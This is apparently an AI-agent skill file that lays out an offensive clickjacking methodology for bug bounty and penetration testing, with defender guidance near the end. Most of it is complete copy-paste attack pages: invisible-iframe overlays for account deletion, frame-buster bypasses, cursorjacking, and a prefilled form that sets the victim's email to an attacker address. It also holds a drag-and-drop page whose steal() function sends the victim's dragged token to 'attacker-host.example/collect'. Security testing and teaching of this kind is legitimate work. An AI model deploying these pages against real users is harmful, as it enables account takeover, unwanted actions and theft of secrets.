---
name: offensive-clickjacking
description: "Clickjacking and UI redressing testing skill for offensive security assessments and bug bounty hunting. Covers framability detection (missing or misconfigured X-Frame-Options and CSP frame-ancestors, legacy ALLOW-FROM), transparent iframe overlay attacks, opacity and pointer-positioning tricks, frame-busting bypass via double-framing and sandbox, drag-and-drop data exfiltration, likejacking, cursorjacking, multi-step and prefilled-form clickjacking, clickjacking-plus-CSRF to defeat token protections, and mobile tapjacking. Includes copy-paste PoC HTML/CSS, Burp Clickbandit workflow, and defender guidance on frame-ancestors, X-Frame-Options, SameSite cookies, and correct frame-busting. Use when testing whether a page can be framed, building clickjacking proof-of-concepts, assessing UI redressing risk, or chaining clickjacking with CSRF."
---

# Clickjacking — Offensive Testing Methodology

Clickjacking (UI redressing) tricks a victim into clicking something different from
what they perceive, by loading a target application inside an attacker-controlled page
and overlaying it with decoy UI. The target renders normally; the victim's clicks land
on invisible or disguised target controls. Unlike XSS, no code runs in the target
origin — the attack abuses the victim's authenticated session and the browser's
willingness to frame the target. The entire skill hinges on one question: *can this page
be framed?* If framing is blocked by `X-Frame-Options` or CSP `frame-ancestors`, almost
every technique below collapses. This skill covers proving framability, building working
overlay and drag-drop PoCs, defeating JavaScript frame-busters, and chaining clickjacking
with CSRF to defeat anti-CSRF tokens.

## Quick Workflow

1. Pick a target state-changing action on an authenticated page (delete account, change email, transfer funds, grant a role, confirm a purchase, "Like"/follow).
2. Test framability — load the page in an iframe and check for `X-Frame-Options` / CSP `frame-ancestors` response headers.
3. If framable, build a transparent-overlay PoC and align the decoy so the victim's click hits the sensitive control.
4. If a JavaScript frame-buster fires, defeat it (sandbox, double-framing, `onbeforeunload` abuse).
5. Escalate: multi-step flows, drag-and-drop exfiltration, prefilled forms, or clickjacking + CSRF when the action is token-protected but idempotent via UI.
6. Capture evidence (screen recording of the decoy vs. the actual effect) and report with concrete business impact.

---

## Framability Detection

The only precondition for clickjacking is that the browser will render the target in a
frame owned by another origin. Check this first — it saves you from building a PoC against
a page that cannot be framed.

### Header Inspection

```bash
# Look specifically for the two headers that control framing
curl -sI https://example.com/account/settings | grep -iE 'x-frame-options|content-security-policy'

# Full header dump when nothing obvious shows up (headers may be set per-path or per-method)
curl -sI https://example.com/account/settings
```

What the results mean:

| Response state | Framable? | Notes |
|---|:--:|---|
| No `X-Frame-Options` and no CSP `frame-ancestors` | ✓ | Classic clickjacking candidate |
| `X-Frame-Options: DENY` | ✗ | Cannot be framed by anyone |
| `X-Frame-Options: SAMEORIGIN` | ✗ | Cannot be framed cross-origin |
| `X-Frame-Options: ALLOW-FROM https://trusted.example` | ⚠ | Legacy, ignored by Chrome/Safari — often effectively absent |
| `Content-Security-Policy: frame-ancestors 'none'` | ✗ | Modern equivalent of DENY |
| `Content-Security-Policy: frame-ancestors 'self'` | ✗ | Cross-origin framing blocked |
| `Content-Security-Policy: frame-ancestors *` or missing directive | ✓ | Explicitly or implicitly allows framing |
| `frame-ancestors https://*.example.com` | ⚠ | Framable from any subdomain — pivot via subdomain takeover / XSS |

Precedence note: when both headers are present, CSP `frame-ancestors` is authoritative in
modern browsers and overrides `X-Frame-Options`. A page with `X-Frame-Options: DENY` but
`frame-ancestors *` is framable. Always evaluate CSP first.

### Minimal Framability Probe

Drop this on an attacker host and open it. If you see the target render inside the box,
it is framable. A blank box plus a console error (`Refused to display ... in a frame
because it set 'X-Frame-Options'` or `because an ancestor violates the ... frame-ancestors`)
means framing is blocked.

```html
<!DOCTYPE html>
<html>
  <head><title>Framability probe</title></head>
  <body>
    <h3>Target render test</h3>
    <iframe src="https://example.com/account/settings"
            width="1000" height="700"
            style="border: 2px solid red;"></iframe>
    <p>If the target appears above, it can be framed.</p>
  </body>
</html>
```

### Per-Path and Per-Method Gaps

Framing protection is frequently applied inconsistently. Enumerate:

- Different paths: the login page may set `X-Frame-Options` while `/account/delete` does not.
- Different methods: headers added on `GET` but absent on the `POST` handler, or vice versa.
- Error and legacy pages: 404s, maintenance pages, old API docs, and `/mobile/` or `/m/` variants often lack the header.
- CDN / WAF edge rules that only match specific hostnames or path prefixes.
- `report-only` CSP: `Content-Security-Policy-Report-Only: frame-ancestors 'none'` does **not** enforce anything — the page is still framable. This is a common misconfiguration.

```bash
# Sweep a path list for missing frame protection
while read path; do
  hdr=$(curl -sI "https://example.com${path}" | grep -iE 'x-frame-options|frame-ancestors')
  echo "[$( [ -z "$hdr" ] && echo FRAMABLE || echo protected )] ${path}"
done < paths.txt
```

---

## Basic Overlay Attack

The core technique: load the target in a transparent iframe stacked above decoy content,
then position the iframe so the sensitive control sits exactly under the element the
victim is enticed to click.

### How the Layering Works

- The iframe is rendered with `opacity: 0` (fully transparent) or a low value for tuning.
- `position: absolute` with a high `z-index` places the invisible iframe on top of the decoy.
- `pointer-events` stays enabled on the iframe, so clicks pass to the target, not the decoy.
- Negative `top`/`left` offsets scroll the target so the target button lands over the decoy button.

### Complete Copy-Paste Overlay PoC

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <title>You won a prize!</title>
    <style>
      body { font-family: sans-serif; margin: 0; }

      /* Decoy content the victim believes they are interacting with */
      #decoy {
        position: absolute;
        top: 0; left: 0;
        width: 1000px; height: 700px;
        z-index: 1;
        text-align: center;
      }
      #decoy button {
        position: absolute;
        top: 300px; left: 430px;   /* place the bait under the real control */
        width: 140px; height: 44px;
        font-size: 18px;
        background: #28a745; color: #fff; border: none; cursor: pointer;
      }

      /* Target application, invisible, layered on top */
      #target {
        position: absolute;
        top: 0; left: 0;
        width: 1000px; height: 700px;
        z-index: 2;              /* above the decoy so clicks hit it */
        opacity: 0;              /* set to 0.3 while aligning, 0 to weaponize */
        border: none;
      }

      /* Fine-alignment offsets: scroll the iframe so the sensitive
         button lands exactly over #decoy button. Tune per target. */
      #target {
        top: -250px;   /* shift target content up */
        left: -300px;  /* shift target content left */
      }
    </style>
  </head>
  <body>
    <div id="decoy">
      <h1>Congratulations — claim your free gift</h1>
      <p>Click the button below to claim.</p>
      <button>Claim gift</button>
    </div>

    <iframe id="target"
            src="https://example.com/account/delete-confirm"></iframe>
  </body>
</html>
```

Alignment workflow: set `#target { opacity: 0.3; }` so you can see both layers, drag the
decoy button until it sits over the target's "Confirm" control, then switch back to
`opacity: 0`. Record a video with opacity revealed, then with it hidden, to document the
deception for your report.

### Sizing and Scroll Variants

- `scrolling="no"` on the iframe prevents the victim from noticing scrollbars.
- Use CSS `transform: scale(...)` on the iframe to make a small target button occupy a larger clickable zone.
- For targets that reflow responsively, set a fixed iframe width to force the desktop layout you aligned against.

---

## Defeating Frame-Busting JavaScript

Some targets ship client-side "frame-busters" that try to break out of frames. These are
unreliable and routinely bypassable — a page relying on JS frame-busting instead of
`X-Frame-Options`/`frame-ancestors` is still reportable.

Typical (weak) frame-buster:

```javascript
if (top !== self) {
  top.location = self.location;   // try to replace the attacker page
}
```

### Bypass: HTML5 Sandbox

The `sandbox` attribute without `allow-top-navigation` prevents the framed page from
navigating the top window, neutering the buster while the page still renders and accepts
clicks.

```html
<iframe src="https://example.com/account/settings"
        sandbox="allow-forms allow-scripts"></iframe>
<!-- No allow-top-navigation => top.location assignment is blocked,
     but forms and scripts still function for the victim's click. -->
```

### Bypass: `onbeforeunload` Cancel Loop

When the buster calls `top.location = ...`, the browser fires `beforeunload`. The attacker
page can repeatedly cancel the navigation.

```html
<script>
  // Attacker top-page: keep cancelling the buster's navigation attempt
  window.onbeforeunload = function () {
    return "Are you sure you want to leave?";
  };
</script>
<iframe src="https://example.com/account/settings"></iframe>
```

A variant pumps a dummy navigation into a 204 (No Content) endpoint so the frame-buster's
`top.location` write is swallowed:

```html
<script>
  var killer = "https://attacker-host.example/204";  // returns HTTP 204
  var prevent = function () { window.top.location = killer; };
  setInterval(prevent, 1);   // out-race the buster's navigation
</script>
<iframe src="https://example.com/account/settings"></iframe>
```

### Bypass: Double-Framing

Older busters read `parent.location`, which throws a cross-origin `SecurityError` when the
target sits two frames deep. Nest your own same-origin frame around the target to break
the `parent` reference the buster depends on.

```html
<!-- attacker.example/outer.html -->
<iframe src="https://attacker-host.example/inner.html"></iframe>
```

```html
<!-- attacker.example/inner.html -->
<iframe src="https://example.com/account/settings"></iframe>
<!-- The buster's parent.location read now hits a cross-origin boundary
     and throws, so the location assignment never executes. -->
```

### Bypass: Restricted Scripting

If the buster relies on a script that you can starve, `sandbox` without `allow-scripts`
disables the target's JavaScript entirely. This only works when the target control does
not itself need JavaScript to submit (e.g., a plain HTML form `POST`).

---

## Drag-and-Drop Data Exfiltration

Clickjacking is not limited to clicks. Drag-and-drop clickjacking makes the victim drag a
token, text, or file from the (invisible) target into an attacker-controlled drop zone,
exfiltrating data that framing alone cannot read. This defeats same-origin read
restrictions because the *victim's own drag gesture* carries the data across origins.

### Complete Copy-Paste Drag-Drop PoC

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <title>Drag the puzzle piece to win</title>
    <style>
      body { font-family: sans-serif; }

      /* Invisible target: a page that renders a secret (API token,
         CSRF token, private message) as selectable/draggable text. */
      #secretFrame {
        position: absolute;
        top: -80px; left: 20px;   /* align the secret text under "drag from here" */
        width: 900px; height: 400px;
        opacity: 0;
        z-index: 2;
        border: none;
      }

      /* Decoy "drag from" marker, under the invisible secret */
      #from {
        position: absolute;
        top: 60px; left: 40px;
        width: 160px; height: 40px;
        background: #ffc107; text-align: center; line-height: 40px;
        z-index: 1;
      }

      /* Attacker drop zone that reads whatever text is dropped */
      #to {
        position: absolute;
        top: 300px; left: 500px;
        width: 220px; height: 120px;
        border: 3px dashed #0d6efd; text-align: center; line-height: 120px;
        z-index: 1;
      }
    </style>
  </head>
  <body>
    <h2>Drag the gold piece into the blue box to claim your reward</h2>
    <div id="from">Drag from here</div>
    <div id="to" ondrop="steal(event)" ondragover="event.preventDefault()">
      Drop here
    </div>

    <!-- Target page whose rendered secret becomes the drag payload -->
    <iframe id="secretFrame" src="https://example.com/account/api-token"></iframe>

    <script>
      function steal(ev) {
        ev.preventDefault();
        // Text the victim dragged out of the cross-origin target
        var data = ev.dataTransfer.getData("text");
        new Image().src =
          "https://attacker-host.example/collect?d=" + encodeURIComponent(data);
        document.getElementById("to").innerText = "Reward unlocked!";
      }
    </script>
  </body>
</html>
```

The victim performs a single drag from the "gold piece" to the "blue box." Because the
invisible target frame is positioned so its secret text sits under the start of the drag,
the browser places that cross-origin text into the `dataTransfer` object, which the
attacker's `drop` handler reads. Modern browsers have tightened cross-origin drag data, so
confirm behavior on the victim's likely browser and version.

---

## Likejacking and Cursorjacking

### Likejacking

A narrow, high-value overlay variant: the invisible target is a social "Like"/follow/
subscribe control, and the decoy is a play button, image gallery, or "continue" link.
Each victim click silently generates an endorsement that spreads the lure page.

```html
<style>
  #likeFrame {
    position: absolute; top: -34px; left: -18px;   /* center the Like button */
    width: 120px; height: 60px; opacity: 0; z-index: 2; border: none;
  }
  #play {
    position: absolute; top: 0; left: 0;
    width: 90px; height: 28px; z-index: 1; cursor: pointer;
  }
</style>
<div id="play">▶ Play video</div>
<iframe id="likeFrame" src="https://example.com/widget/like?id=123"></iframe>
```

Follow the social widget's own iframe cursor as it moves — likejacking often pairs with a
decoy that tracks the pointer so the Like button stays under the cursor wherever the
victim clicks.

### Cursorjacking

Hide the real cursor and render a fake one at an offset, so the victim aims at a decoy
while the true pointer sits over the target control.

```html
<style>
  html { cursor: none; }                 /* hide the real pointer */
  #fakeCursor {
    position: absolute; width: 20px; height: 20px;
    background: url(data:image/png;base64,iVBORw0KGgo=) no-repeat;  /* cursor image */
    pointer-events: none; z-index: 9999;
  }
  #target { position: absolute; opacity: 0; z-index: 2; border: none; }
</style>
<img id="fakeCursor" />
<iframe id="target" src="https://example.com/account/confirm"></iframe>
<script>
  // Render the fake cursor at a fixed offset from the true pointer.
  // The victim compensates by moving so the FAKE cursor hits the decoy,
  // which puts the TRUE pointer over the hidden target button.
  document.addEventListener("mousemove", function (e) {
    var c = document.getElementById("fakeCursor");
    c.style.left = e.pageX + 30 + "px";   // horizontal offset
    c.style.top = e.pageY + 30 + "px";
  });
</script>
```

---

## Multi-Step and Prefilled-Form Clickjacking

Many sensitive actions require several clicks (open menu → choose option → confirm). A
single overlay only covers one click, so multi-step clickjacking chains overlays or uses
timed repositioning to walk the victim through the whole flow.

### Timed Repositioning

```html
<iframe id="t" src="https://example.com/account" style="position:absolute;opacity:0;z-index:2;border:none;"></iframe>
<div id="bait" style="position:absolute;z-index:1;top:300px;left:430px;">Click to continue</div>
<script>
  // Step 1: iframe aligned so "Settings" is under #bait.
  // After the victim's first click, scroll the iframe so the next
  // control ("Delete account") lands under the same bait position.
  var steps = [
    { top: -120, left: -300 },  // settings menu entry
    { top: -480, left: -300 },  // delete account entry
    { top: -640, left: -260 },  // final confirm button
  ];
  var i = 0;
  var frame = document.getElementById("t");
  function place() {
    frame.style.top = steps[i].top + "px";
    frame.style.left = steps[i].left + "px";
  }
  place();
  document.getElementById("bait").addEventListener("click", function () {
    i = Math.min(i + 1, steps.length - 1);
    setTimeout(place, 50);   // reposition for the next click
  });
</script>
```

### Prefilled Forms via URL Parameters

If a target form accepts values from query parameters (`?email=...&role=admin`), prefill
it so the victim's single click submits attacker-chosen data. This turns a benign-looking
"submit" into account takeover (change recovery email), privilege grant, or fund transfer.

```html
<!-- Target reflects query params into form fields, then the victim's
     click on the overlaid Submit sends attacker-controlled values. -->
<iframe
  src="https://example.com/account/update?email=attacker@evil.example&notify=off"
  style="position:absolute;opacity:0;z-index:2;border:none;width:1000px;height:700px;top:-220px;left:-280px;">
</iframe>
<div style="position:absolute;z-index:1;top:320px;left:440px;">
  <button style="width:140px;height:44px;">Get started</button>
</div>
```

---

## Clickjacking + CSRF: Defeating Token Protections

Anti-CSRF tokens stop forged *cross-site requests* because the attacker cannot read the
victim's token. Clickjacking sidesteps this entirely: the request is submitted *from
within the legitimate framed page*, so the browser includes the real, server-issued CSRF
token and session cookie automatically. The victim's own click is the "CSRF," and the
token travels with it.

Why this works:

- The target form is rendered inside the iframe with its genuine hidden `csrf_token` value.
- The victim clicks the overlaid submit button; the `POST` originates from the target origin with a valid token.
- Standard synchronizer-token CSRF defenses do nothing, because nothing is forged — a real user clicked a real button in a real session.

```html
<!-- The framed page already contains <input type="hidden" name="csrf_token" ...>
     issued to the victim's session. Clickjacking makes the victim submit it. -->
<iframe
  src="https://example.com/account/change-email"
  style="position:absolute;opacity:0;z-index:2;border:none;width:1000px;height:700px;top:-260px;left:-300px;">
</iframe>
<div style="position:absolute;z-index:1;top:340px;left:450px;">
  <h1>Spin to win!</h1>
  <button style="width:150px;height:46px;">Spin now</button>
</div>
```

What actually stops this combination:

- `SameSite=Lax`/`Strict` cookies: a framed cross-site `POST` will not carry the session cookie, so the authenticated action fails. This is the single most effective defense against clickjacking-driven state change.
- `frame-ancestors`/`X-Frame-Options`: prevent the framing in the first place.
- Re-authentication or an interstitial confirmation that cannot be pre-satisfied by a single click (e.g., re-enter password, type a confirmation phrase).

Report clickjacking + CSRF with elevated severity when the target action is sensitive,
cookies are `SameSite=None` (or default on a browser that still sends them in frames), and
framing is permitted.

---

## Mobile Tapjacking (Brief)

Tapjacking is the mobile analogue: a malicious Android app draws an overlay on top of a
legitimate app or system dialog so the victim's taps land on hidden controls (grant a
permission, confirm a payment, enable accessibility).

- Historically via `SYSTEM_ALERT_WINDOW` ("draw over other apps") plus a transparent, non-touchable overlay (`FLAG_NOT_TOUCHABLE` on the decoy so taps pass through to the victim app).
- Android defenses: `android:filterTouchesWhenObscured="true"` on sensitive views, and `View.setFilterTouchesWhenObscured(true)`, cause the framework to drop touches delivered through an overlay. Android 12+ further restricts untrusted overlays on sensitive actions.
- For web content in a mobile `WebView`, the same `frame-ancestors`/`X-Frame-Options` rules apply — test the mobile site and in-app browser separately, as they frequently drop framing headers present on the desktop site.

---

## Tooling: Burp Clickbandit

Burp Suite ships **Clickbandit**, a point-and-click clickjacking PoC generator that
removes most manual CSS alignment work.

```
Burp Suite → Tools (or Burp menu) → Clickbandit → Copy Clickbandit to clipboard
```

Workflow:

1. In Burp, open Clickbandit and copy the generated JavaScript to the clipboard.
2. Browse to the authenticated target page and paste the script into the browser DevTools console.
3. Clickbandit overlays the page in "record" mode — click through the exact actions you want the victim to perform.
4. Switch to "finish"; Clickbandit emits a standalone HTML PoC with the decoy aligned to your recorded clicks.
5. Host the generated HTML and validate end-to-end against a fresh authenticated session.

Clickbandit respects framing headers — if it cannot frame the page, that itself confirms
the page is protected.

---

## Detection / Defender View

What defenders deploy, and how each holds up:

### CSP `frame-ancestors` (Primary, Modern)

```http
Content-Security-Policy: frame-ancestors 'none';
```

```http
# Allow only same-origin and one trusted partner
Content-Security-Policy: frame-ancestors 'self' https://partner.example.com;
```

- `frame-ancestors 'none'` blocks all framing; `'self'` blocks cross-origin framing.
- Supersedes `X-Frame-Options` in modern browsers. Must be sent as an enforced header — a `Content-Security-Policy-Report-Only` header does **not** block framing.
- Apply on **every** response that can change state or reveal data, not just the login page.

### `X-Frame-Options` (Legacy Fallback)

```http
X-Frame-Options: DENY
```

```http
X-Frame-Options: SAMEORIGIN
```

- `DENY` and `SAMEORIGIN` are well supported; keep for older browsers alongside CSP.
- `ALLOW-FROM uri` is obsolete and ignored by Chrome and Safari — do not rely on it; use `frame-ancestors` for an allow-list.

### SameSite Cookies (Defense in Depth)

```http
Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax
```

- `SameSite=Lax` (modern default) and `Strict` stop the session cookie from riding along with a framed cross-site state-changing request, neutralizing clickjacking-driven CSRF even if framing somehow succeeds.
- Pair with synchronizer CSRF tokens and re-authentication on sensitive actions.

### Frame-Busting Done Right

JavaScript frame-busting is a fallback only — all the bypasses above apply. If you must use
it, start hidden and reveal only after confirming you are the top window:

```html
<style id="antiClickjack">body { display: none !important; }</style>
<script>
  if (self === top) {
    var s = document.getElementById("antiClickjack");
    s.parentNode.removeChild(s);   // reveal page only when not framed
  } else {
    top.location = self.location;  // best-effort break-out
  }
</script>
```

This pattern (ship hidden, un-hide only when unframed) fails closed, unlike naive
`top.location` busters that leave content visible and clickable. It is still not a
substitute for `frame-ancestors`.

### What Defenders See

- Clickjacking generates no anomalous requests in the target origin — the requests look like normal authenticated user actions. Server logs show a legitimate session performing a real action; there is no injection signature.
- The signal lives at the perimeter: referrer/origin headers pointing to an unknown third-party host on state-changing requests, spikes of a single action from many sessions sharing a referrer, or user reports of actions they did not knowingly take.
- Detect proactively by scanning your own estate for missing `frame-ancestors`/`X-Frame-Options` rather than hunting post-exploitation traffic.

---

## Engagement Cheatsheet

```bash
# 1. Enumerate framing protection across the target's paths/methods
curl -sI https://example.com/account/settings | grep -iE 'x-frame-options|content-security-policy'
for m in GET POST; do curl -s -o /dev/null -D - -X $m https://example.com/account/delete \
  | grep -iE 'x-frame-options|frame-ancestors'; done
```

```
# 2. Confirm framability with the minimal probe (iframe + red border).
# 3. Build the overlay PoC; align at opacity:0.3, weaponize at opacity:0.
# 4. If a JS frame-buster fires: try sandbox="allow-forms allow-scripts",
#    then double-framing, then onbeforeunload / 204-navigation loop.
# 5. For data theft, use the drag-and-drop PoC instead of a click overlay.
# 6. For token-protected actions, frame the real form (clickjacking + CSRF);
#    check whether SameSite blocks the cookie before claiming impact.
# 7. Generate/validate quickly with Burp Clickbandit, then host and retest
#    against a fresh authenticated session; record decoy-vs-effect video.
```

Severity drivers: sensitivity of the action (account/email/role/funds), whether framing is
permitted, cookie `SameSite` posture, and whether a single click completes the action vs.
requiring an un-fakeable confirmation.

---

## Key References

- OWASP Clickjacking Defense Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html
- OWASP Testing Guide — Testing for Clickjacking (WSTG-CLNT-09): https://owasp.org/www-project-web-security-testing-guide/
- CWE-1021: Improper Restriction of Rendered UI Layers or Frames — https://cwe.mitre.org/data/definitions/1021.html
- PortSwigger Web Security Academy — Clickjacking labs and notes: https://portswigger.net/web-security/clickjacking
- PortSwigger — Burp Clickbandit: https://portswigger.net/burp/documentation/desktop/tools/clickbandit
- MDN — CSP `frame-ancestors`: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors
- MDN — `X-Frame-Options`: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
- MDN — `SameSite` cookies: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite
- Rydstedt, Bursztein, Boneh, Jackson — "Busting Frame Busting: a Study of Clickjacking Vulnerabilities at Popular Sites" (Stanford, 2010): https://seclab.stanford.edu/websec/framebusting/framebust.pdf
- Android Developers — `filterTouchesWhenObscured` (tapjacking defense): https://developer.android.com/reference/android/view/View#security
